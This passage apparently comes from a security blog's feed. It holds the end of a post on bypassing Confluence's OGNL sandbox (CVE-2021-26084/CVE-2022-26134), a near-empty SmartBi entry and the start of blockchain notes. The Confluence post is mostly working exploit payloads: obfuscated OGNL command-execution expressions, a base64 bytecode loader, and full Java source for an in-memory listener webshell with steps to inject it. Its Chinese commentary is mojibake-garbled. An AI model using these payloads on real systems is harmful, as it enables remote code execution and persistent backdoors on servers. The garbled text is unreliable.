<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
</code></pre></div></div>

<p>çœ‹åˆ°æˆ‘å°±æ„Ÿè§‰æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºåœ¨CVE-2021-26084çš„æ£€æµ‹ä¸­å°±å·²ç»æŠŠèµ‹å€¼è¯­å¥ç»™ç¦æ­¢äº†ï¼Œå¹¶ä¸”å³ä½¿è°ƒç”¨é™æ€æ–¹æ³• <strong>org.apache.commons.io.IOUtils</strong> ä¹Ÿä¸åœ¨ç™½åå•å†…ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164348.png" alt="image-20220613105853012" /></p>

<p>åæ¥æ‰çŸ¥é“ç½‘ä¸Šæµä¼ æ¯”è¾ƒå¹¿æ³›çš„å¤§å¤šéƒ½æ˜¯é’ˆå¯¹è¿˜æ²¡æœ‰æ²™ç®±çš„ç‰ˆæœ¬ï¼ˆ7.4 ä»¥ä¸‹ï¼‰ï¼Œå®é™…ä¸Šåœ¨7.18ç‰ˆæœ¬ confluenceéƒ½è¿˜æ²¡èƒ½æŠŠå¤§å†™ <strong>Class</strong> åŠ å…¥åˆ° unsafePropertyNames ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡<code class="language-plaintext highlighter-rouge">${Class.forName()}</code>æ‹¿åˆ°Classå¯¹è±¡ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//javax.script.ScriptEngineManager åœ¨é»‘åå•ä¸­ï¼Œ
${(Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec("open -a Calculator")'))}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">OgnlUtil.compile(expr)</code>ä¼šå°†exprä¸­çš„å•å¼•å·å˜æˆåŒå¼•å·ï¼Œä¸è¿‡åœ¨å¼•å·å†…çš„ç¬¦å·ä¼šé»˜è®¤åŠ ä¸Š<code class="language-plaintext highlighter-rouge">\</code>ï¼Œä¸ä¼šè¢«é—­åˆã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${(Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("whoami").getInputStream())'))}
</code></pre></div></div>
<p>Phith0né‡‡ç”¨çš„æ˜¯JavaScriptçš„String.fromCharCodeæ¥é¿å…å¼•å·ç›¸å…³çš„é—®é¢˜ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("eval(String.fromCharCode(118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,105,100,39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115))")}
</code></pre></div></div>

<p>å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆåç»­å°±æ˜¯æ‹¿å›æ˜¾çš„é—®é¢˜ï¼Œ</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getResponse',null).invoke(null,null).setHeader('X-CMD',Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("whoami").getInputStream())'))}
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164355.png" alt="image-20220613165315157" /></p>

<h3 id="æ³¨å…¥å†…å­˜æœ¨é©¬">æ³¨å…¥å†…å­˜æœ¨é©¬</h3>

<p>èƒ½æ‰§è¡Œï¼Œæœ‰å›æ˜¾ï¼Œç¦»æ³¨å…¥å†…å­˜é©¬å°±åªå·®æœ€ååŠ¨æ€åŠ è½½å­—èŠ‚ç äº†ã€‚</p>

<p>è¦æƒ³åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œé€šè¿‡urlè¿›è¡Œgetä¼ è¾“è‚¯å®šä¸è¡Œï¼Œæˆ‘ä»¬é€šè¿‡contextå¯¹è±¡æ‹¿åˆ°requestå±æ€§ä»è€Œæå–Parameterå±æ€§ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//ä»¥ä¸‹ä¸¤ç§æ–¹å¼å‡å¯
${Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getResponse',null).invoke(null,null).setHeader('X-CMD',Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter("theoyu")))}

${Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getResponse',null).invoke(null,null).setHeader('X-CMD',Class.forName('jav'+'ax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(Class.forName('com.opensymphony.webwork.ServletActionContext').getMethod('getRequest',null).invoke(null,null).getParameter("theoyu")))}

theoyu=java.lang.Runtime.getRuntime().exec("open+-a+Calculator")

</code></pre></div></div>

<p>contextåœ¨å›æ˜¾çš„æ—¶å€™å·²ç»è§£å†³äº†ï¼Œç°åœ¨æ˜¯è¦æ‰¾ä¸€ä¸ªdefineClassçš„ç‚¹ï¼Œ</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var classBytes = java.util.Base64.getDecoder().decode("yv66vgAAADcAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTFJjZTsBAApFeGNlcHRpb25zBwAZAQAKU291cmNlRmlsZQEACFJjZS5qYXZhDAAHAAgHABoMABsAHAEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAHQAeAQADUmNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAABAAEAAUADQAGAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAAAACABE=");
var loader = java.lang.Thread.currentThread().getContextClassLoader();
var reflectUtilsClass = java.lang.Class.forName("org.springframework.cglib.core.ReflectUtils",true,loader);
var defineClassMethod = reflectUtilsClass.getMethod("defineClass",java.lang.String.class,java.lang.Class.forName("[B"),java.lang.ClassLoader.class);
var o =  defineClassMethod.invoke(null,"Rce",classBytes,loader);
o.newInstance();
</code></pre></div></div>

<p>å‡†å¤‡<code class="language-plaintext highlighter-rouge">ListenerShell</code> å’Œ<code class="language-plaintext highlighter-rouge">AddListener</code></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ListenerShell</span> <span class="kd">implements</span> <span class="nc">ServletRequestListener</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="nc">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="nc">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">RequestFacade</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="nc">RequestFacade</span><span class="o">)</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">();</span>
            <span class="nc">Field</span> <span class="n">requestField</span><span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"request"</span><span class="o">);</span>
            <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="nc">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">req</span><span class="o">);</span>
            <span class="nc">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">String</span><span class="o">[]</span> <span class="n">commands</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
                <span class="nc">String</span> <span class="n">charsetName</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"window"</span><span class="o">)</span> <span class="o">?</span> <span class="s">"GBK"</span> <span class="o">:</span> <span class="s">"UTF-8"</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toUpperCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"WIN"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="s">"cmd"</span><span class="o">;</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="s">"/c"</span><span class="o">;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="o">;</span>
                    <span class="n">commands</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="s">"-c"</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">commands</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
                <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">commands</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
                <span class="nc">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">,</span> <span class="n">charsetName</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
                <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AddListener</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">AddListener</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
        <span class="kt">var</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"ListenerShell"</span><span class="o">);</span>
        <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">opensymphony</span><span class="o">.</span><span class="na">webwork</span><span class="o">.</span><span class="na">ServletActionContext</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
        <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">appctx</span> <span class="o">=</span><span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
        <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
        <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">atx</span><span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
        <span class="n">atx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">StandardContext</span><span class="o">)</span> <span class="n">atx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
        <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">newInstance</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//åˆ†ä¸¤æ¬¡æ‰“è¿›å»ï¼š</span>
<span class="c1">//å…ˆæ³¨å†ŒListenerShell</span>
<span class="n">theoyu</span><span class="o">=</span> <span class="kt">var</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">"yv66vgAAA......"</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
        <span class="kt">var</span> <span class="n">reflectUtilsClass</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.cglib.core.ReflectUtils"</span><span class="o">,</span><span class="kc">true</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">reflectUtilsClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"[B"</span><span class="o">),</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">o</span> <span class="o">=</span>   <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"ListenerShell"</span><span class="o">,</span><span class="n">classBytes</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="n">o</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>

<span class="c1">//å†æ‰“AddLisenter</span>
<span class="n">theoyu</span><span class="o">=</span> <span class="kt">var</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">"yv66vgAAAD......"</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
        <span class="kt">var</span> <span class="n">reflectUtilsClass</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.cglib.core.ReflectUtils"</span><span class="o">,</span><span class="kc">true</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">reflectUtilsClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"[B"</span><span class="o">),</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">o</span> <span class="o">=</span>   <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"AddListener"</span><span class="o">,</span><span class="n">classBytes</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="n">o</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
</code></pre></div></div>

<p>ä¸Šé¢åªæ˜¯å•çº¯çš„å›æ˜¾shellï¼Œä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥åšå“¥æ–¯æ‹‰æˆ–è€…å†°èçš„å†…å­˜æœ¨é©¬ï¼Œè¿™é‡Œä¸æ¼”ç¤ºäº†ã€‚</p>]]></content><author><name>Theoyu</name></author><category term="codeAudit" /><category term="VUL-Reproduce" /><category term="JAVA" /><summary type="html"><![CDATA[FROM CVE-2021-26084 TO CVE-2022-26134 ,Bypass Sandbox And Inject Memory Shell]]></summary></entry><entry><title type="html">SmartBi V10.5 Pre-Auth RCE</title><link href="https://theoyu.top/2022/codeaudit/SmartBi-V10.5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" rel="alternate" type="text/html" title="SmartBi V10.5 Pre-Auth RCE" /><published>2022-06-06T00:00:00+08:00</published><updated>2022-06-06T00:00:00+08:00</updated><id>https://theoyu.top/2022/codeaudit/SmartBi%20V10.5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1</id><content type="html" xml:base="https://theoyu.top/2022/codeaudit/SmartBi-V10.5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><![CDATA[<p>ğŸ¶</p>]]></content><author><name>Theoyu</name></author><category term="codeAudit" /><category term="VUL-Reproduce" /><summary type="html"><![CDATA[ğŸ¶]]></summary></entry><entry><title type="html">ã€åŒºå—é“¾æŠ€æœ¯ä¸åº”ç”¨ã€å­¦ä¹ ç¬”è®°</title><link href="https://theoyu.top/2022/cource/BitCoin" rel="alternate" type="text/html" title="ã€åŒºå—é“¾æŠ€æœ¯ä¸åº”ç”¨ã€å­¦ä¹ ç¬”è®°" /><published>2022-05-13T00:00:00+08:00</published><updated>2022-05-13T00:00:00+08:00</updated><id>https://theoyu.top/2022/cource/BitCoin</id><content type="html" xml:base="https://theoyu.top/2022/cource/BitCoin"><![CDATA[<!--more-->

<h1 id="æ¯”ç‰¹å¸">æ¯”ç‰¹å¸</h1>

<h2 id="æ¯”ç‰¹å¸ä¸­çš„å¯†ç å­¦">æ¯”ç‰¹å¸ä¸­çš„å¯†ç å­¦</h2>

<h3 id="å“ˆå¸Œ">å“ˆå¸Œ</h3>

<p>hashçš„æ€§è´¨ï¼š</p>

<ol>
  <li><strong>collision resistance</strong>ï¼šå“ˆå¸Œç¢°æ’ä¸æ˜¯ä¸ä¼šå‘ç”Ÿï¼Œæ˜¯æŒ‡å¾ˆéš¾ä»¥äººä¸ºçš„æ–¹å¼å»æ„é€ ã€‚</li>
  <li><strong>hiding</strong>ï¼šå“ˆå¸Œå‡½æ•°çš„è®¡ç®—è¿‡ç¨‹æ˜¯å•å‘ã€ä¸å¯é€†çš„ã€‚</li>
  <li><strong>puzzle friendly</strong>ï¼šhashè®¡ç®—çš„ç»“æœæ— æ³•é¢„æµ‹ã€‚</li>
</ol>

<p>æ¯”ç‰¹å¸ä¸­ç”¨åˆ°çš„å“ˆå¸Œå‡½æ•°æ˜¯ SHA-256ï¼ˆSecure Hash Algorithmï¼‰ã€‚</p>

<h3 id="ç­¾å">ç­¾å</h3>

<p>å»ä¸­å¿ƒåŒ–çš„æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ï¼Œç”±äºæ²¡æœ‰ç¬¬ä¸‰æ–¹ï¼Œæ‰€ä»¥éœ€è¦ã€ ç­¾å ã€æ˜ç¡®äº¤æ˜“çš„è´¦æˆ·ã€‚</p>

<p>æ•°å­—ç­¾åé‡‡ç”¨ç§é’¥è¿›è¡Œç­¾åï¼Œå…¬å¸ƒçš„å…¬é’¥è¿›è¡ŒéªŒè¯ã€‚</p>

<h2 id="æ¯”ç‰¹å¸ä¸­çš„æ•°æ®ç»“æ„">æ¯”ç‰¹å¸ä¸­çš„æ•°æ®ç»“æ„</h2>

<h3 id="hash-pointerå“ˆå¸ŒæŒ‡é’ˆ">Hash pointerï¼ˆå“ˆå¸ŒæŒ‡é’ˆï¼‰</h3>

<p>åŒºå—é“¾ç»“æ„æœ¬èº«æ˜¯ä¸€æ¡é“¾è¡¨ï¼ŒèŠ‚ç‚¹ä¸ºåŒºå—ï¼Œé“¾è¡¨é€šè¿‡æŒ‡é’ˆæŒ‡å‘çš„åœ°å€æŠŠèŠ‚ç‚¹æ‰€ä¸²è¿èµ·æ¥ï¼Œåœ¨åŒºå—é“¾ä¸­ä½¿ç”¨çš„å“ˆå¸ŒæŒ‡é’ˆé™¤äº†å‰ä¸€åŒºå—çš„åœ°å€ï¼Œè¿˜åŒ…å«å‰ä¸€åŒºå—çš„å“ˆå¸Œã€‚</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="n">genesis</span> <span class="n">block</span>        <span class="n">A</span>             <span class="n">B</span>       <span class="n">most</span> <span class="n">recent</span> <span class="n">block</span>
    <span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>   <span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>   <span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>   <span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
    <span class="err">â”‚</span>          <span class="err">â”‚</span>   <span class="err">â”‚</span> <span class="n">H</span><span class="p">()</span>      <span class="err">â”‚</span>   <span class="err">â”‚</span> <span class="n">H</span><span class="p">()</span>      <span class="err">â”‚</span>   <span class="err">â”‚</span> <span class="n">H</span><span class="p">()</span>      <span class="err">â”‚</span>
    <span class="err">â”‚</span>          <span class="err">â”‚â—„â”€â”€â”¤</span>          <span class="err">â”‚â—„â”€â”€â”¤</span>          <span class="err">â”‚â—„â”€â”€â”¤</span>          <span class="err">â”‚</span>
    <span class="err">â”‚</span>          <span class="err">â”‚</span>   <span class="err">â”‚</span>          <span class="err">â”‚</span>   <span class="err">â”‚</span>          <span class="err">â”‚</span>   <span class="err">â”‚</span>          <span class="err">â”‚</span>
    <span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>   <span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>   <span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>   <span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>

</code></pre></div></div>

<p>å¦‚ä¸Šå›¾ï¼Œæ¯ä¸ªåŒºå—éƒ½å­˜æœ‰ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œå“ˆå¸Œå€¼çš„è®¡ç®—åŒ…æ‹¬ä¸Šä¸€ä¸ªåŒºå—å†…å®¹æœ¬èº«+ä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œï¼Œä»è€Œä¿è¯äº†å†…å®¹ä¸è¢«ç¯¡æ”¹ï¼ˆ<strong>tamper- evident log</strong>ï¼‰ã€‚</p>

<p>æ¯”å¦‚å¦‚æœç ´åAçš„åŒºå—ï¼Œåˆ™Bå­˜æ”¾çš„å“ˆå¸Œå€¼éœ€è¦ä¿®æ”¹ï¼Œæœ€æ–°çš„åŒºå—å“ˆå¸Œå€¼ä¼šè®¡ç®—Bçš„å“ˆå¸Œï¼Œä»è€Œä¹Ÿä¼šä¿®æ”¹ï¼Œæ‰€ä»¥åªè¦è®°ä½æœ€åä¸€ä¸ªåŒºå—çš„åœ°å€ï¼Œå³å¯æ£€æµ‹é“¾ä¸Šå†…å®¹æ˜¯å¦è¢«ç¯¡æ”¹ã€‚</p>

<h3 id="merkle-tree-é»˜å…‹å°”æ ‘">Merkle tree ï¼ˆé»˜å…‹å°”æ ‘ï¼‰</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220611171217.png" alt="image-20220611145500812" /></p>

